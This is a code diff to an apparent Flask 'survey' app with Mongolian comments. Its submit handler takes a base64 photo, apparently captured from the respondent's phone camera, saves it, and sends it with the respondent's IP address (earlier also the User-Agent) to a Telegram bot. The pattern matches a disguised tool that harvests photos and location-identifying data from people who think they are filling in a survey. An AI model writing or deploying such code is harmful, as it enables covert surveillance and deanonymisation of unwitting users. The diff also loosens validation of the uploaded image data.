@@ -75,47 +75,42 @@ def success():
     """
 
 # ----------------- Өгөгдөл Хүлээн Авах API -----------------
-@app.route('/submit', methods=['POST']) # ЭНЭ МӨР ЗӨВ БАЙХ ЁСТОЙ
+@app.route('/submit', methods=['POST'])
 def submit():
     role_department = request.form.get('role_department', 'Хариулаагүй')
     profession = request.form.get('profession', 'Хариулаагүй')
-    photo_data = request.form.get('photo_data', None)
+    photo_data = request.form.get('photo_data', '') # Хоосон текст авах
     
     image_filepath = None
 
-    if photo_data and photo_data.startswith('data:image/'):
+    # Зураг ирсэн эсэхийг маш сайн шалгах
+    if photo_data and ',' in photo_data:
         try:
-            # Base64 датаг салгаж авах 
-            header, encoded = photo_data.split(',', 1)
-            image_data = base64.b64decode(encoded)
+            # Зөвхөн хэрэгтэй дата хэсгийг салгах
+            encoded_data = photo_data.split(',')[1]
+            image_data = base64.b64decode(encoded_data)
             
-            # Файлын нэр үүсгэх
             filename = f"capture_{int(time.time())}.jpg"
             image_filepath = os.path.join(UPLOAD_FOLDER, filename)
             
-            # Файлыг хадгалах
             with open(image_filepath, 'wb') as f:
                 f.write(image_data)
-            
-            print(f"Зураг амжилттай хадгалагдлаа: {image_filepath}")
-        
+            print(f"Зураг хадгалагдлаа: {image_filepath}")
         except Exception as e:
-            print(f"Зураг боловсруулах алдаа: {e}")
+            print(f"Зургийн алдаа: {e}")
             image_filepath = None
 
+    # Мессеж бэлдэх
     message = (
-        f"📋 ШИНЭ СУДАЛГААНЫ ХАРИУЛТ:\n\n"
-        f"1) Албан тушаал, Хэлтэс: {role_department}\n"
-        f"2) Мэргэжил, Ажлын чиглэл: {profession}\n\n"
-        f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
-        f"📍 IP: {request.remote_addr}\n"
-        f"🌐 User-Agent: {request.headers.get('User-Agent')}"
+        f"📋 ШИНЭ ХАРИУЛТ (УТАСНААС):\n\n"
+        f"👤 Хэлтэс: {role_department}\n"
+        f"💼 Мэргэжил: {profession}\n\n"
+        f"📍 IP: {request.remote_addr}"
     )
     
-    # 4. Telegram руу зураг болон текст илгээх
+    # Telegram руу илгээх (Зураг алдаатай байсан ч текстийг заавал илгээнэ)
     send_telegram_media_notification(message, image_filepath=image_filepath)
 
-    # 5. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
     return redirect(url_for('success'))
     
 if __name__ == '__main__':
